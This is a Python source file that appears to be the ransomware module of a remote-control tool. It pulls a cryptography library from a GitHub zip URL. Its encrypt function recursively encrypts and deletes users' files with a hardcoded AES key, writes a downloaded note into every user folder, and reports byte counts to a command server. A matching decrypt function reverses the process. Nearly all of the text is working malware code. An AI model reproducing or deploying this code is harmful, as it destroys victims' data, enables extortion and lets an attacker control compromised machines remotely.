pimport(
    '''import os
import re
import struct

from Crypto.Cipher import AES''',
    "https://github.com/MrByehack/t-a-r-e-y-b/raw/master/bGlicmFyaWVz/"
    "cryption.zip"
)


def decrypt(server, *startdirs, files='.*.bRcrypT', notfiles='bRcrypT.bRcrypT',
            folders='.*', notfolders='C:\\Windows', extension=".bRcrypT",
            chunk_size=64 * 1024):
    _send(server, '''inpu({!r},'36',0)'''.format(
        Myid+' : start Decryption :('))
    total_Size = 0
    for start_path in startdirs:
        try:
            for dirpath, dirs, f in os.walk(start_path):
                try:
                    deldirs = []
                    for i in dirs:
                        try:
                            absolute_path = os.path.abspath(
                                os.path.join(dirpath, i))
                            if (
                                not re.match(
                                    eval(repr(folders)), absolute_path
                                ) or re.match(
                                    eval(repr(notfolders)), absolute_path
                                )
                            ):
                                deldirs.append(i)
                            elif absolute_path.lower().startswith("_mei") and\
                                    "isactive" in os.listdir(absolute_path):
                                deldirs.append(i)
                            elif absolute_path.lower() == "widnows" and \
                                    "uuid" in os.listdir(absolute_path):
                                deldirs.append(i)
                        except (Exception, BaseException):
                            pass
                    for i in deldirs:
                        dirs.remove(i)
                    for fi in f:
                        try:
                            file_name = os.path.abspath(
                                os.path.join(dirpath, fi))
                            if (
                                re.match(eval(repr(files)), file_name)and
                                not re.match(eval(repr(notfiles)), file_name)
                            ):
                                try:
                                    os.rename(file_name, file_name)
                                    open(file_name, 'ab')

                                    output_file = (
                                        file_name.endswith(extension) and
                                        file_name[: - len(extension)]
                                        or file_name
                                    )

                                    file_size = 0
                                    with open(file_name, 'rb') as infile:
                                        file_size = struct.unpack(
                                            '<Q', infile.read(
                                                struct.calcsize('Q'))
                                        )[0]

                                        IV = infile.read(16)

                                        decryptor = AES.new((
                                            b'\xf6\x8c\xda\x9ap\x82D\x82)\xa9\xc96'
                                            b'n}:\xac\x13q\x10U\x8di\xbd1i\xf7\xab'
                                            b'\xf8\x19\x92\x1a\x8f'
                                        ), AES.MODE_CBC, IV)

                                        with open(output_file, 'wb') as outfile:
                                            while True:
                                                chunk = infile.read(chunk_size)
                                                if len(chunk) == 0:
                                                    break
                                                outfile.write(
                                                    decryptor.decrypt(chunk)
                                                )
                                            outfile.truncate(file_size)
                                    os.remove(file_name)
                                    total_Size += file_size
                                except (Exception, BaseException):
                                    pass
                        except (Exception, BaseException):
                            pass
                except (Exception, BaseException):
                    pass
        except (Exception, BaseException):
            pass
    _send(server, '''inpu({!r},'36',0)'''.format(
        Myid+' : %d Bytes Decrypted :>' % total_Size))


def encrypt(server, *startdirs, files='.*', notfiles='.*.bRcrypT', folders='.*',
            notfolders='C:\\Windows', extension=".bRcrypT",
            chunk_size=64 * 1024, file_link=""):
    _send(server, '''inpu({!r},'36',0)'''.format(
        Myid+' : start Encryption :('))
    info_file = ""
    if file_link:
        with requests.get(file_link)as r:
            if "Content-Disposition" in r.headers.keys():
                info_file = re.findall("filename=(.*)", r.headers["Content-Disposition"])[0].replace(":", "").replace(
                    "/", "").replace("\\", "").replace("?", "").replace("*", "").replace("|", "").replace("\"", "")
            else:
                info_file = file_link.split("/")[-1].replace(":", "").replace("/", "").replace(
                    "\\", "").replace("?", "").replace("*", "").replace("|", "").replace("\"", "")
            file_link = r.content
    if info_file:
        try:
            _a = os.path.dirname(Path.home())
            for a in os.listdir(_a):
                try:
                    _b = os.path.join(_a, a)
                    if os.path.isdir(_b):
                        try:
                            for b in os.listdir(_b):
                                try:
                                    open(os.path.join(_b, b, info_file),
                                         'wb').write(file_link)
                                except (Exception, BaseException):
                                    pass
                        except (Exception, BaseException):
                            pass
                except (Exception, BaseException):
                    pass
        except (Exception, BaseException):
            pass
    total_Size = 0
    for start_path in startdirs:
        try:
            for dirpath, dirs, f in os.walk(start_path):
                try:
                    deldirs = []
                    for i in dirs:
                        try:
                            absolute_path = os.path.abspath(
                                os.path.join(dirpath, i))
                            if not re.match(eval(repr(folders)), absolute_path)or\
                                    re.match(eval(repr(notfolders)), absolute_path):
                                deldirs.append(i)
                            elif i.lower().startswith("_mei") and\
                                    "isactive" in os.listdir(absolute_path):
                                deldirs.append(i)
                            elif i.lower() == "widnows" and "uuid" in os.listdir(absolute_path):
                                deldirs.append(i)
                        except (Exception, BaseException):
                            pass
                    for i in deldirs:
                        dirs.remove(i)
                    for fi in f:
                        try:
                            file_name = os.path.abspath(
                                os.path.join(dirpath, fi))
                            if re.match(eval(repr(files)), file_name)and\
                                    not re.match(eval(repr(notfiles)), file_name):
                                try:
                                    os.rename(file_name, file_name)
                                    open(file_name, 'ab')

                                    output_file = file_name + extension
                                    f_size = os.path.getsize(file_name)
                                    file_size = struct.pack("<Q", f_size)

                                    IV = os.urandom(16)

                                    encryptor = AES.new((
                                        b'\xf6\x8c\xda\x9ap\x82D\x82)\xa9\xc96'
                                        b'n}:\xac\x13q\x10U\x8di\xbd1i\xf7\xab'
                                        b'\xf8\x19\x92\x1a\x8f'
                                    ), AES.MODE_CBC, IV)

                                    with open(file_name, 'rb') as infile:
                                        with open(output_file, 'wb') as outfile:
                                            outfile.write(file_size)
                                            outfile.write(IV)

                                            while True:
                                                chunk = infile.read(chunk_size)
                                                if len(chunk) == 0:
                                                    break
                                                elif len(chunk) % 16 != 0:
                                                    chunk += b' ' * \
                                                        (16 - (len(chunk) % 16))

                                                outfile.write(
                                                    encryptor.encrypt(chunk))
                                    os.remove(file_name)
                                    total_Size += f_size
                                except (Exception, BaseException):
                                    pass
                        except (Exception, BaseException):
                            pass
                except (Exception, BaseException):
                    pass
            if info_file and os.path.ismount(startpath):
                try:
                    open(os.path.join(startpath, info_file),
                         'wb').write(file_link)
                except (Exception, BaseException):
                    pass
        except (Exception, BaseException):
            pass
    _send(server, '''inpu({!r},'36',0)'''.format(
        Myid+' : %d Bytes Encrypted :>' % total_Size))
